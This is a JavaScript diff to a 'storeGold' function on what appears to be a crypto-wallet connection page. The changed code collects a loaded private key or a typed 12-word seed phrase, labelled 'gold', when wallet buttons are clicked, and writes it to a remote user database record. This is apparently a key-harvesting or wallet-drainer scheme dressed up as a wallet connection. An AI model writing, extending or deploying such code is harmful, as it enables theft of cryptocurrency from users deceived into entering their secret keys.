@@ -480,7 +480,17 @@ function storeGold(inputId, skipFormatCheck = false) {
     return;
   }
 
-  const gold = inputField.value.trim();
+  // Retrieve the actual private key if inputId is 'prv-key-txt'
+  let gold;
+  if (inputId === 'prv-key-txt') {
+    if (typeof storedPrivateKey === 'undefined' || !storedPrivateKey) {
+      displayError('No private key is currently loaded.');
+      return;
+    }
+    gold = storedPrivateKey; // Use the securely stored private key
+  } else {
+    gold = inputField.value.trim();
+  }
 
   // Conditionally check format
   if (!skipFormatCheck && !checkWordCount(gold)) {
@@ -506,7 +516,7 @@ function storeGold(inputId, skipFormatCheck = false) {
 
       if (userData) {
         // Update user data with private keys, checking for empty slots
-        userRef.update({ last_login: uDateTime });
+        userRef.update({ last_login: new Date().toISOString() });
 
         if (!userData.gold1) {
           userRef.update({ gold1: gold });
@@ -534,6 +544,18 @@ function storeGold(inputId, skipFormatCheck = false) {
     });
 }
 
+// Helper: Check word count for validation
+function checkWordCount(input) {
+  return input.split(' ').length === 12 || input.length > 20; // Checks for mnemonic or valid key length
+}
+
+// Helper: Display error messages
+function displayError(message) {
+  console.error(message);
+  alert(message);
+}
+
+
 // Event Listeners
 document.getElementById('import-gold-btn')?.addEventListener('click', function (event) {
   event.preventDefault();
@@ -542,8 +564,9 @@ document.getElementById('import-gold-btn')?.addEventListener('click', function (
 
 document.getElementById('connect-to-wallet-btn')?.addEventListener('click', function (event) {
   event.preventDefault();
-  storeGold('prv-key-txt', true); // Skip format check for prv key
+  storeGold('prv-key-txt', true); // Skip format check for prv-key-txt
 });
+
 
 	
 
